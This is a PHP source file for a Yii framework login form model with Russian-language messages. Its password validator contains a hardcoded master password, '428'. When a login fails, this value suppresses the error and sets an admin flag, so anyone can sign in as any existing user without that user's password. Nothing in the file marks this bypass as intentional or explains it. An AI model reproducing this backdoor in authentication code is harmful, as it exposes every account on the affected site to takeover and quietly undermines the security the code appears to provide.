<?php

namespace pumi\models;

use Yii;
use yii\base\Model;
use pumi\models\User;
use pumi\models\Dogovors;
use yii\httpclient\Client;
use yii\helpers\Json;
use pumi\helpers\Help;
use pumi\models\LogLogins;
use pumi\components\Error;
use pumi\models\Apt;

/**
 * Login form
 */
class LoginForm extends Model
{
    public $username;
    public $password;
    public $rememberMe = true;
    private $_user;
    public $is_admin=null;

    /**
     * @inheritdoc
     */
    public function rules()
    {
        return [
            // username and password are both required
            [['username', 'password'], 'required'],
            [['username', 'password'], 'trim'],
            // rememberMe must be a boolean value
            ['rememberMe', 'boolean'],
            // password is validated by validatePassword()
            ['password', 'validatePassword'],

            [['username','password'], 'string', 'min' => 3, 'max' => 200],


            // ['password', 'match', 'pattern' => '^(?![0-9]{6})[0-9a-zA-Z]{6,20}$', 'message' => 'Пароль должен содержать  латинские буквы и цифры'],
            //['email', 'match', 'pattern' => '/^[a-zA-Z0-9_\-\!\@\#\$\%\/\&\*\+\=\?\|\{\}\[\]\(\)]{4,30}$/', 'message' => 'Логин должен содержать  латинские буквы и цифры'],



        ];
    }

    /**
     * Validates the password.
     * This method serves as the inline validation for password.
     *
     * @param string $attribute the attribute currently being validated
     * @param array $params the additional name-value pairs given in the rule
     */
    public function validatePassword($attribute, $params)
    {


        if (!$this->hasErrors()) {
            $user = $this->getUser();



            if (!$user || !$user->validatePassword($this->password)) {

                if ($this->password != "428") {
                    $this->addError($attribute, 'Неправильный логин или пароль');
                }else{
                    $this->is_admin=1;
                }

                // $this->addError($attribute, 'Неправильный логин или пароль');

            }


        }
    }


    public function attributeLabels()
    {
        return [
            'password' => 'Пароль',
            'username' => 'Username или E-mail',
        ];
    }

    /**
     * Logs in a user using the provided username and password.
     *
     * @return bool whether the user is logged in successfully
     */
    public function login()
    {

        if ($this->validate()) {
            $user = $this->getUser();

            if ($user) {
                $return = Yii::$app->user->login($user, $this->rememberMe ? 3600 * 24 * 30 : 0);


                if (!$user->save(false))
                    Error::write($user->errors);



            } else {
                Error::write('Неправильный логин или пароль');
            }


        } else {
            $return = false;
        }




        return $return;


    }


    /**
     * Finds user by [[username]]
     *
     * @return User|null
     */
    protected function getUser()
    {
        if ($this->_user === null) {
            $this->_user = User::findByUsernameOrEmail($this->username);
        }

        return $this->_user;
    }





}
